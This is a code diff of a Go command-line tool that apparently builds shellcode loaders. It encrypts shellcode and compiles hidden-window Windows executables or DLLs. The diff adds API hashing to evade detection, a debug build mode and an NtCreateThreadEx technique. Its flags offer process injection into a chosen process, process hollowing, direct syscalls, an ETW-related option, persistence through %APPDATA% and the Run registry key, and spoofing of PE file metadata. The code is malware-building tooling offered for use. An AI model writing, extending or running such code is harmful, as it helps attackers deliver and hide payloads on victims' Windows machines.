@@ -43,16 +43,24 @@ const ASCII_ART = `
     `
 
 func BuildLoader(opts *Options) *exec.Cmd {
-    os.Setenv("GOOS", opts.OS)
-    os.Setenv("GOARCH", opts.Arch)
+	os.Setenv("GOOS", opts.OS)
+	os.Setenv("GOARCH", opts.Arch)
 	if opts.BuildType == "dll" {
 		os.Setenv("CGO_ENABLED", "1")
 		os.Setenv("CC", "x86_64-w64-mingw32-gcc")
 		fmt.Println("[*] Compiling payload as dll...")
 
+		if opts.WithDebug {
+			return exec.Command("go", "build", "-buildmode=c-shared", "-o", "payload.dll", ".")
+		}
+
 		return exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.dll", ".")
 	} else if opts.BuildType == "exe" {
 		fmt.Println("[*] Compiling payload as executable...")
+
+		if opts.WithDebug {
+			return exec.Command("go", "build", "-o", "payload.exe", ".")
+		}
 
 		return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
 	} else {
@@ -63,7 +71,7 @@ func BuildLoader(opts *Options) *exec.Cmd {
 
 func GetParser(opts *Options) *cobra.Command {
 
-	version := "1.2.0"
+	version := "1.2.2"
 	var spoofMetadata = &cobra.Command{
 		Use:                "spoof",
 		Version:            version,
@@ -142,7 +150,7 @@ func GetParser(opts *Options) *cobra.Command {
 				os.Exit(1)
 			}
 
-			/* i got 99 problems but generating a random key aint one */
+			/* generating a random key if none are selected */
 			if opts.Key == "" {
 				opts.Key = tools.RandomString(32)
 			}
@@ -190,9 +198,6 @@ func GetParser(opts *Options) *cobra.Command {
 					panic(err)
 				}
 
-				fmt.Println("\n...downloading necessary library...")
-				fmt.Println("if it fails because of your internet connection, please consider using XOR or AES instead")
-
 				/* Running `go get "golang.org/x/crypto/chacha20poly1305"` in MYPH_TMP_DIR` */
 				execCmd := exec.Command("go", "get", "golang.org/x/crypto/chacha20poly1305")
 				execCmd.Dir = MYPH_TMP_DIR
@@ -206,9 +211,6 @@ func GetParser(opts *Options) *cobra.Command {
 					fmt.Println("[!] Could not encrypt with Blowfish")
 					panic(err)
 				}
-
-				fmt.Println("\n...downloading necessary library...")
-				fmt.Println("if it fails because of your internet connection, please consider using XOR or AES instead")
 
 				/* Running `go get golang.org/x/crypto/blowfish in MYPH_TMP_DIR` */
 				execCmd := exec.Command("go", "get", "golang.org/x/crypto/blowfish")
@@ -224,6 +226,7 @@ func GetParser(opts *Options) *cobra.Command {
 				panic(err)
 			}
 
+			/* FIXME(djnn): this should not work like this but instead have a flag and an array of techniques like the rest */
 			persistData := ""
 			if opts.Persistence != "" {
 				persistData = fmt.Sprintf(`persistExecute("%s")`, opts.Persistence)
@@ -258,7 +261,7 @@ func GetParser(opts *Options) *cobra.Command {
 				panic(err)
 			}
 
-			templateFunc := loaders.SelectTemplate(opts.Technique)
+			templateFunc := loaders.SelectTemplate(opts.Technique, opts.UseAPIHashing, opts.APIHashingType)
 			if templateFunc == nil {
 				fmt.Printf("[!] Could not find a technique for this method: %s\n", opts.Technique)
 				os.Exit(1)
@@ -270,19 +273,33 @@ func GetParser(opts *Options) *cobra.Command {
 			}
 
 			fmt.Printf("\n[+] Template (%s) written to tmp directory. Compiling...\n", opts.Technique)
+
+			if opts.UseAPIHashing {
+				execGoGetCmd := exec.Command("go", "get", "github.com/Binject/debug/pe")
+				execGoGetCmd.Dir = MYPH_TMP_DIR
+				_, _ = execGoGetCmd.Output()
+			}
+
 			execCmd := BuildLoader(opts)
 			execCmd.Dir = MYPH_TMP_DIR
 
-			_, stderr := execCmd.Output()
+			var stderr error
+			_, stderr = execCmd.Output()
 
 			if stderr != nil {
+
+				command := "go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe"
+				if opts.BuildType == "dll" {
+					command = "CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags \"-s -w -H=windowsgui\" -o payload.dll"
+				}
+
 				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
 				fmt.Printf(
 					"\nYou may try to run the following command in %s to find out what happend:\n\n GOOS=%s GOARCH=%s %s\n\n",
 					MYPH_TMP_DIR,
 					opts.OS,
 					opts.Arch,
-					"go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
+					command,
 				)
 
 				fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
@@ -308,12 +325,15 @@ func GetParser(opts *Options) *cobra.Command {
 	rootCmd.Flags().StringVarP(&opts.OutName, "out", "f", defaults.OutName, "output name")
 	rootCmd.Flags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
 	rootCmd.Flags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
-	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, EnumCalendarInfoA, Syscall, Etwp)")
-	rootCmd.Flags().StringVarP(&opts.BuildType, "builtype", "b", defaults.BuildType, "define the output type (allowed: exe, dll)")
+	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, NtCreateThreadEx, Syscall, SyscallTest, Etwp)")
 	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
 	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
-	rootCmd.PersistentFlags().StringVarP(&opts.Persistence, "persistence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
+	rootCmd.Flags().BoolVarP(&opts.WithDebug, "debug", "d", false, "builds binary with debug symbols")
+	rootCmd.Flags().BoolVarP(&opts.UseAPIHashing, "use-api-hashing", "", false, "Use API Hashing")
+	// TODO(djnn): re-add this flag once supported
+	// rootCmd.Flags().StringVarP(&opts.APIHashingType, "api-hashing-type", "", "DJB2", "Hashing algorithm used for API hashing")
+	rootCmd.Flags().StringVarP(&opts.Persistence, "persistence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
 
 	spoofMetadata.Flags().StringVarP(&opts.PEFilePath, "pe", "p", defaults.PEFilePath, "PE file to spoof")
 	spoofMetadata.Flags().StringVarP(&opts.VersionFilePath, "file", "f", defaults.VersionFilePath, "manifest file path (as JSON)")
